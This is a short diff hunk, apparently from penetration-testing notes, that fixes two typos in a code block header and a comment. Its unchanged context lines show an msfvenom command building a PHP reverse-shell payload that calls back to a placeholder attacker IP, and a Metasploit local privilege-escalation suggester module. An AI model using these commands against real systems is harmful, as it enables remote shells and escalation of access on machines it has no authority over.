@@ -16,8 +16,8 @@
 msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
 ```
 
-```bahsh
-# privileg escalation audit and suggestion
+```bash
+# privilege escalation audit and suggestion
 use post/multi/recon/local_exploit_suggester
 ```
 
